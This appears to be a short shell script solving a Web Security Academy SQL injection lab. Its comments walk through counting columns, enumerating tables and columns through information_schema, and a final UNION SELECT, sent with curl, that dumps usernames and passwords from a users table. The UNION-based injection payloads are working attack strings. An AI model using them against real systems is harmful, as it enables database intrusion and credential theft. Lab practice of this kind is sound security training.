BASE_URL="https://0a3f00c7044a1c4880303fe4006a0055.web-security-academy.net"
ENDPOINT="/filter"

# The query returns two columns, server error generated for 3. So our query is returning two columns.
# NOTE the space after the --, which is required to comment out the rest of the query for this non-Oracle DB.
# QUERY="category=Pets%27+ORDER+BY+2--+"

# We can get table names this way...
# QUERY="category=Whocares%27+UNION+SELECT+TABLE_NAME%2CNULL+FROM+information_schema.tables--+"

# Can we get column names? Yes!
# QUERY="category=Whocares%27+UNION+SELECT+TABLE_NAME%2CCOLUMN_NAME+FROM+information_schema.columns--+"

# Find a table like "users" and the columns it has
# QUERY="category=Whocares%27+UNION+SELECT+TABLE_NAME%2CCOLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME+LIKE+%27%25user%25%27--+"

# I discovered a table named users_vyaiqm with columns named username_yaupvd, email, and password_usloyk
QUERY="category=Whocares%27+UNION+SELECT+username_yaupvd%2Cpassword_usloyk+FROM+users_vyaiqm--+"

out=$(curl "${BASE_URL}${ENDPOINT}?${QUERY}")
echo "$out"
